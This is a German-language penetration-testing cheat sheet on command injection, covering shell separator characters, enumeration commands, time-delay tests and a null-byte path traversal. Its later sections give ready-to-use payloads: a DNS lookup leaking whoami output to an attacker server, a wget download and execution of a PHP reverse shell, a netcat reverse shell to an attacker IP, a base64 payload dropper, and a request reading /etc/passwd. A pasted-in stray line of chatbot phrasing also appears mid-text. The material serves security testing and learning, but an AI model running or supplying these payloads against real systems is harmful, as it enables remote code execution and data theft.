---
description: Einschleusen von Systembefehlen
---

# Command Injection

<details>

<summary>Links:</summary>

[https://github.com/payloadbox/command-injection-payload-list](https://github.com/payloadbox/command-injection-payload-list)

</details>

Command Injection (Befehlsinjektion) beschreibt eine schwerwiegende Sicherheitslücke, bei der ein Angreifer beliebige Betriebssystembefehle in eine Anwendung einschleusen kann. Dies geschieht typischerweise durch manipulierte Parameter in URLs, Formularen oder HTTP-Requests. Der Angriff ist möglich, wenn Benutzereingaben ungefiltert an eine Shell übergeben werden, z. B. über `exec()`, `system()`, `passthru()`,`popen()` oder ähnliche Funktionen in serverseitigem Code.

## 0. Testen auf Command Injection

### 0.a Blind Injection

Hier sollten Blind-Injection-Payloads mit delay verwendet werden um die Anwendung für bestimmte Zeit zu blockieren, was die Anfälligkeit beweist.

Dafür können bspw. `ping` oder `sleep` verwendet werden.&#x20;

Ebenso kann der Output eines Befehls per `>` in eine Datei geschrieben werden, die dann mit `cat` ausgelesen werden kann.

### 0.b Verbose Injection

Da hier der Output direkt durch die Web-Applikation dargestellt wird, kann durch bspw. `ping` oder `whoami` die Anfälligkeit geprüft werden.

***

## **1. Typische Einfallstore für Befehlsinjektionen**

Die Schwachstelle tritt häufig bei Anwendungen auf, die Benutzereingaben in einem Systemkontext ausführen – etwa zur Verarbeitung von Dateipfaden, Pingen von Hosts oder Aufrufen von Hilfsprogrammen. Jede Eingabe, die an eine URL oder einen Befehlskontext angehängt wird, kann potenziell angreifbar sein.

**Beispielhafte URLs mit Injektionsmöglichkeit:**

```
http://example.com/ping?host=127.0.0.1
http://example.com/process?user=name
```

***

## **2. Zeichen zur Befehlstrennung (Special Characters)**

Zur Durchführung von Command Injections werden Zeichen verwendet, die die Shell zur Trennung oder Verkettung von Befehlen interpretiert. Diese Zeichen ermöglichen es, über reguläre Eingaben hinaus zusätzliche Befehle einzuschleusen.

| Zeichen         | Funktion                                              |
| --------------- | ----------------------------------------------------- |
| `&`             | Führt mehrere Befehle nacheinander aus                |
| `;`             | Trennt zwei Befehle (unabhängige Ausführung)          |
| `&&`            | Führt zweiten Befehl nur bei Erfolg des ersten aus    |
| `` `command` `` | Führt `command` aus und ersetzt ihn durch die Ausgabe |
| `$(command)`    | Alternative zu Backticks für Befehlsausführung        |
|  (Newline)      | Neue Zeile – kann zur Trennung genutzt werden         |

***

## **3. Nützliche Befehle für die Enumeration**

#### **Linux**

```bash
whoami         # Benutzername
ifconfig       # Netzwerkinformationen
ls             # Verzeichnisinhalt
uname -a       # Systeminformationen
```

#### **Windows**

```cmd
whoami         # Benutzername
ipconfig       # Netzwerkinformationen
dir            # Verzeichnisinhalt
ver            # Betriebssystemversion
```

***

## **4. Plattformübergreifende Testpayloads**

Diese Payloads funktionieren unter Unix- und Windows-Systemen, um einfache Prüfungen vorzunehmen.

```bash
ls||id
ls | id
ls && id
ls & id
ls %0A id     # URL-codierter Newline zur Trennung
```

***

## **5. Zeitbasierte Erkennung (Time Delay)**

**Zweck:** Testen, ob ein injizierter Befehl tatsächlich ausgeführt wird – etwa durch Beobachtung von Antwortverzögerungen.

```bash
& ping -c 10 127.0.0.1 &
```

**Hinweis:** Unter Windows funktioniert z. B. `ping -n 10 127.0.0.1`

***

## **6. Ausgabeumleitung und Dateischreibung**

Injektionen lassen sich durch Umleitung der Befehlsausgabe verifizieren. Die Resultate werden z. B. in eine Datei geschrieben, auf die später zugegriffen werden kann.

```bash
& whoami > /var/www/images/output.txt &
```

***

## **7. Out-of-Band (OOB) Exploitation**

Wenn keine direkte Rückmeldung erfolgt, kann die Injektion über externe Server validiert werden. Dies eignet sich besonders bei restriktiven Firewalls oder Logging-basierten Auswertungen.

```bash
& nslookup attacker-server.com &
& nslookup `whoami`.attacker-server.com &
```

Diese Methode überträgt Ausgaben via DNS-Request an einen kontrollierten Server und bestätigt so die Injektion indirekt.

***

## **8. WAF-Umgehungstechniken**

Web Application Firewalls (WAFs) versuchen häufig, bekannte Payloads zu blockieren. Durch Kodierung, Umstrukturierung oder alternative Syntax können diese Schutzmechanismen umgangen werden.

**Beispiele:**

```bash
vuln=127.0.0.1%0a wget https://evil.txt/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
```

```bash
vuln=127.0.0.1%0anohup nc -e /bin/bash <attacker-ip> <attacker-port>
```

```bash
vuln=echo PAYLOAD > /tmp/payload.txt; cat /tmp/payload.txt | base64 -d > /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
```

Diese Methoden ermöglichen unter anderem das Nachladen und Ausführen von Reverse Shells oder skriptbasierten Angriffen.

Hier ist ein professionell formulierter **Mini-Zusammenschrieb**, der das beschriebene Szenario technisch präzise zusammenfasst und gleichzeitig den geeigneten Kontext in Ihrer standardkonformen Angriffskategorisierung bestimmt:

***

## **9. Poison Null Byte Bypass**

**Beschreibung:**\
Ein **Poison Null Byte** ist eine klassische Technik zur Umgehung serverseitiger Filtermechanismen, insbesondere bei Pfad- oder Dateiverarbeitungen. Der Null-Byte-Zeichenwert (`%00`) signalisiert in vielen Programmiersprachen (v. a. in C/C-basierten Umgebungen) das Ende eines Strings. Durch gezielte Manipulation — z. B. in Kombination mit Dateiendungen — kann ein Angreifer erreichen, dass der Server eine Datei anders interpretiert als beabsichtigt.

**Beispiel:**\
Ein Server blockiert den Zugriff auf `.md`-Dateien mit einem `403 Forbidden`. Durch Einschleusen eines Null-Byte-Zeichens (`%00`) vor einer erlaubten Dateiendung wird der Pfad abgeschnitten und die Zugriffskontrolle umgangen. In URL-kodierter Form muss das `%00` nochmals kodiert werden → `%2500`.

**Angriffsvektor:**

```
/download.php?file=../../etc/passwd%2500.md
```

Der Server prüft auf `.md`, bricht aber die Pfadverarbeitung beim Nullbyte ab und gibt ggf. den Inhalt von `/etc/passwd` aus.
